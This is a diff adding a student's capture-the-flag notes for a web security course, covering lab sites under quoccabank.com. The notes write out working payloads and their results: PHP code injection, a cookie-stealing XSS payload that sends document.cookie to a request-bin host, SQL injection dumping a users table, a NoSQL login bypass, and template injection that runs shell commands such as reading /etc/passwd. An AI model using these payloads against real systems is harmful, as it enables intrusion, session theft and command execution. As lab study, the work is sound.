@@ -1,0 +1,100 @@
+qb1.quoccabank.com
+- opened "here" and downloads git file.
+- checked source code and found href to /.git. something to do with git.
+- downloaded git zip file and unzipped. got empty tmp file. 
+- cd into tmp file and ran git reset --hard HEAD~1. resets the previous commit
+- looked around and found app.py in src/app.py and got password: I_SOLEMNLY_SWEAR_THAT_I_AM_UP_TO_NO_GOOD for username admin.
+- got the flag by entering those details: COMP6443{the_git_that_keeps_on_giving_z5361001_9nbJLqFRX9Y_bcXISRnr}
+
+qb2.quoccabank.com
+- found website.
+- made random blog post with title and content: 'asd', 'asd'
+- noticed post about PHP source code. PHP vulnerability?
+- tried making blog post with title and content: 'asd', '<?php system("whoami") ?>' and successfully get this:
+www-data
+- title and content: 'asd', '<?php system("ls") ?>' and get this:
+create.php
+flag
+index.php
+post.php
+posts
+- title and content: 'asd', '<?php system("cat flag") ?>'.
+- got the flag: COMP6443{oh_thats_code_not_a_blog_post}
+
+qb3.quoccabank.com
+- found website.
+- may be xss since can report page.
+- made random blog post with title and content: 'asd', '<script>alert(1)</script>'. doesn't work.
+- look at source code and see this: <article><script>alert(1)</script></article> without highlight.
+- tried to bypass with &lt;script&gt;alert(1)&lt;/script&gt; but did not work.
+- tried using: <img src=x onerror="alert(1)"> and noticed that " /> leaks into the html. good sign.
+- tried using: <img src=x onerror="alert(1)"><" and noticed that <"" /> leaks into the html.
+- tried using: "><img src=x onerror="alert(1)"> and got successful execution.
+- also realised that this only executes in the title and not in the content.
+- tried using: "><img src=x onerror="fetch('https://enbrsik1gyn67.x.pipedream.net/' + document.cookie)"> but get error about slashes in filenames.
+- found to bypass, using String.fromCharCode.
+- tried using: "> <img src="x" onerror="fetch('https:'+String.fromCharCode(47)+String.fromCharCode(47)+'enbrsik1gyn67.x.pipedream.net'+String.fromCharCode(47))"> and get request sent to rqeuestbin.
+- used: "> <img src="x" onerror="fetch('https:'+String.fromCharCode(47)+String.fromCharCode(47)+'enbrsik1gyn67.x.pipedream.net'+String.fromCharCode(47)+'?q='+document.cookie)"> and reported the 
+page to get the flag: COMP6443{wait_i_thought_attributes_were_fine_z5361001_BfMgsv_t3HMknKcfZ94r}
+
+qb4.quoccabank.com
+- found website.
+- tried ' for username and password "asd" and got internal server error.
+- tried username: ' OR '1'='1'; -- and password "asd" and got: Logged in as user 'george' which doesn't exist? HAX!
+- tried username: ' UNION SELECT table_name FROM information_schema.tables where table_schema=DATABASE(); -- and got this: Logged in as user 'users' which doesn't exist? HAX!. realised this is table_name
+- tried username: ' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'; -- and got this: Logged in as user 'id' which doesn't exist? HAX!
+- tried username: ' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1 OFFSET 1; -- and got this: Logged in as user 'user_password' which doesn't exist? HAX!
+- tried username: ' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1 OFFSET 2; -- and got this: Logged in as user 'username' which doesn't exist? HAX!
+- ' UNION SELECT username FROM users; -- and got: Logged in as user 'george' which doesn't exist? HAX!
+- username: ' UNION SELECT username FROM users LIMIT 1 OFFSET 1; -- and tried all the way until 8 and got this: Congrats you are now admin but the flag is the admin password
+- deleted cookie and restarted
+- username: ' UNION SELECT user_password FROM users LIMIT 1 OFFSET 1; -- and got Logged in as user 'd2hhdCBkbyB5b3UgbWVhbiBoYXJkPyBpdCdzIHRyaXZpYWw=' which doesn't exist? HAX!. looks like base64.
+- username: ' UNION SELECT user_password FROM users LIMIT 1 OFFSET 8; -- and got Logged in as user 'Q09NUDY0NDN7bG9sX3lvdV90aG91Z2h0X2l0X3dhc19hX2xvZ2luP30=' which doesn't exist? HAX!.
+know that this is the admin password because before offset until 8 to get admin username:
+- 'Q09NUDY0NDN7bG9sX3lvdV90aG91Z2h0X2l0X3dhc19hX2xvZ2luP30=' is base64 encoded.
+- decoded is flag: COMP6443{lol_you_thought_it_was_a_login?}
+
+qb5.quoccabank.com
+- tried phishing with request bin site.
+- tried sending $1 to myself. got invalid csrf token.
+- looked in burp suite and found this as payload to api/transfer: csrf_token=MzA5OQ%3D%3D&username=z5361001&amount=1. CSRF is MzA5OQ== which is base64. decoded is 3099 which is likely some sort of id.
+- looked in /robots.txt to find any way to access id.
+- tried again and same csrf token. realised id is definitely not related to transfer id so must be some sort of user id.
+- tried transferring to 'admin' and 'bot' but only bot gave back invalid csrf meaning it is a valid user. burp suite told me csrf is: csrf_token=MzEwMg%3D%3D. which decoded is 3102.
+- tried transferring $2 to myself. and got different csrf token: csrf_token=MzEwMg%3D%3D&username=z5361001&amount=2. CSRF is MzEwMg== which is 3102 when decoded.
+- tried transferring $2 to 'bot'. and got different csrf token: csrf_token=MzEwMg%3D%3D&username=bot&amount=2. CSRF is MzEwMg== which is 3102 when decoded.
+- reloaded the page and looked up input step
+- tried transferring $1 to myself. and got success?? payload is csrf_token=MzEyMg%3D%3D&username=z5361001&amount=1. CSRF is MzEyMg== which is 3122
+
+qc1.quoccabank.com
+- found site.
+- tried login.
+- looked at burp suite and noticed $eq which could be NOSQL syntax and likely NOSQL vulnerability.
+- found this in NOSQL on PayloadsAllTheThings: {"username": {"$ne": null}, "password": {"$ne": null}}
+- tried this payload:
+{"username":{"$ne":"null"},"password":{"$ne":"null"}}
+and got flag: COMP6443{or_1_eq_1_z5361001_pInnH4QnN341Yo6GyUSV}
+
+qc2.quoccabank.com
+- found site.
+- looked through source code.
+- found csp in meta tag: style-src 'self' https://cdn.jsdelivr.net/npm/@picocss/pico@2/css/pico.orange.min.css; script-src 'sha256-fiWmO1SBDsyZHWSC96cpIKA0F/jd7pmpZlRtMOHQIZU=' 'strict-dynamic'; font-src https://cdnjs.cloudflare.com;
+Likely CSP bypass.
+- 
+
+qc3.quoccabank.com
+- found site.
+- tried script tags but doesn't render.
+- looked through source code but found no indication of CSP.
+- tried {{}} and got "you broke something" rendered.
+- tried {{7*7}} and got 49 so confirmed works.
+- tried {{config.items()}} but only got you broke something.
+- tried many payloads but {{range}} returns something useful:
+function range(start, stop, step) { if (typeof stop === "undefined") { stop = start; start = 0; step = 1; } else if (!step) step = 1; var arr = []; if (step > 0) for (var i = start;i < stop; i += step) arr.push(i); else for (var _i = start;_i > stop; _i += step) arr.push(_i); return arr; }
+- tried {{range(1,10)}} and works similar to python's range function.
+- found that can be used to ran javascript like so: {{range.constructor('return this')()}} which creates an object and renders [object Object]
+- found this payload on hacktricks on SSTI: {{range.constructor("return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')")()}}. can do linux commands.
+- used cat ../flag inside execSync but got told to look inside app itself.
+- tried 'env' but can't find the flag in there.
+realised can look through processes with this:
+{{range.constructor("return global.process")()}}
